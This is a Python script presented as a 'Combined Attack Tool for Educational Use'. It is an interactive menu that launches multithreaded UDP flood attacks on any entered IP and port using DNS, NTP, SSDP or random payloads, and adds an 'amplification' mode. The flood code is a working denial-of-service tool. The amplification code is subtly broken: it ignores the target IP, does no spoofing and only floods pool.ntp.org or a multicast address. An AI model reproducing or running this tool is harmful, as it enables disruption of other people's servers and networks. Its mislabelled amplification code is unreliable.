import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Banner
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, "red"))
    print(colored("*******************************************", "yellow"))
    print(colored("*            Combined Attack Tool         *", "yellow"))
    print(colored("*         Created for Educational Use     *", "yellow"))
    print(colored("*******************************************", "yellow"))
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# UDP Flood Variants with Live Stats
def udp_flood_protocol(ip, port, duration, threads, protocol):
    lock = Lock()
    stats = {"packets_sent": 0}
    
    def attack():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        timeout = time.time() + duration

        # Generate protocol-specific payloads
        if protocol == "dns":
            payload = b"\x00\x01"  # Simplified DNS query
        elif protocol == "ntp":
            payload = b"\x17\x00\x03\x2A"  # NTP request
        elif protocol == "ssdp":
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\n\r\n"
        else:
            payload = random._urandom(512)  # Default random payload

        while time.time() < timeout:
            try:
                sock.sendto(payload, (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except KeyboardInterrupt:
                break

    print(colored(f"Starting {protocol.upper()} Flood attack on {ip}:{port}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored(f"\n{protocol.upper()} Flood attack completed.", "green"))

# UDP Amplification Attack
def udp_amplification(ip, duration, threads, amplification_type):
    lock = Lock()
    stats = {"requests_sent": 0}

    def attack():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        timeout = time.time() + duration

        # Amplification-specific payloads
        if amplification_type == "ntp":
            payload = b"\x17\x00\x03\x2A"  # NTP amplification payload
            server = ("pool.ntp.org", 123)
        elif amplification_type == "ssdp":
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\n\r\n"
            server = ("239.255.255.250", 1900)
        else:
            print(colored("Invalid amplification type.", "red"))
            return

        while time.time() < timeout:
            try:
                sock.sendto(payload, server)
                with lock:
                    stats["requests_sent"] += 1
            except KeyboardInterrupt:
                break

    print(colored(f"Starting {amplification_type.upper()} Amplification attack targeting {ip}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Requests sent: {stats['requests_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored(f"\n{amplification_type.upper()} Amplification attack completed.", "green"))

# Main Function
def main():
    while True:
        show_banner()
        print("1. UDP Flood (Protocol-specific)")
        print("2. UDP Amplification Attack")
        print("3. Exit")

        choice = input(colored("Select an option: ", "cyan"))

        if choice == "1":
            ip, port, duration = get_target_info()
            threads = get_threads()
            print("Select protocol:")
            print("1. DNS")
            print("2. NTP")
            print("3. SSDP")
            protocol_choice = input(colored("Enter choice (1/2/3): ", "cyan"))
            protocol_map = {"1": "dns", "2": "ntp", "3": "ssdp"}
            protocol = protocol_map.get(protocol_choice, "random")
            udp_flood_protocol(ip, port, duration, threads, protocol)
        elif choice == "2":
            ip, duration = get_amplification_info()
            threads = get_threads()
            print("Select amplification type:")
            print("1. NTP")
            print("2. SSDP")
            amplification_choice = input(colored("Enter choice (1/2): ", "cyan"))
            amplification_map = {"1": "ntp", "2": "ssdp"}
            amplification_type = amplification_map.get(amplification_choice, "invalid")
            udp_amplification(ip, duration, threads, amplification_type)
        elif choice == "3":
            print(colored("Exiting... Goodbye!", "red"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", "red"))

def get_target_info():
    ip = input(colored("Enter target IP: ", "cyan"))
    port = int(input(colored("Enter target port: ", "cyan")))
    duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    return ip, port, duration

def get_amplification_info():
    ip = input(colored("Enter target IP (spoofed for amplification): ", "cyan"))
    duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    return ip, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
    return min(threads, 100)

if __name__ == "__main__":
    main()
